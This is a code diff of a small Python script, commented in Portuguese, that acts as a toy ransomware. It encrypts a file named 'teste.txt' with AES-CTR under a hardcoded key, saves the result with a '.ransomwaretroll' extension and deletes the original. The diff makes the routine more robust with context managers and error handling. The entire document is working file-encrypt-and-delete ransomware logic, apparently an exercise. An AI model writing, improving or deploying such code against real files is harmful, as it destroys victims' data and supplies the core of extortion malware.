@@ -1,24 +1,36 @@
 import os
 import pyaes
 
-## abrir o arquivo a ser criptografado
+# Nome do arquivo original
 file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
 
-## remover o arquivo
-os.remove(file_name)
+# Nome do arquivo criptografado
+encrypted_file_name = file_name + ".ransomwaretroll"
 
-## chave de criptografia
+# Chave de criptografia
 key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
 
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
+try:
+    # Abrir e ler o arquivo original
+    with open(file_name, "rb") as original_file:
+        file_data = original_file.read()
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+    # Criptografar os dados
+    aes = pyaes.AESModeOfOperationCTR(key)
+    encrypted_data = aes.encrypt(file_data)
+
+    # Salvar o arquivo criptografado
+    with open(encrypted_file_name, "wb") as encrypted_file:
+        encrypted_file.write(encrypted_data)
+
+    # Remover o arquivo original
+    os.remove(file_name)
+
+    print(f"Arquivo '{file_name}' foi criptografado e salvo como '{encrypted_file_name}'.")
+
+except FileNotFoundError:
+    print(f"Erro: O arquivo '{file_name}' não foi encontrado.")
+except PermissionError:
+    print(f"Erro: Permissão negada ao acessar '{file_name}' ou '{encrypted_file_name}'.")
+except Exception as e:
+    print(f"Erro inesperado: {e}")
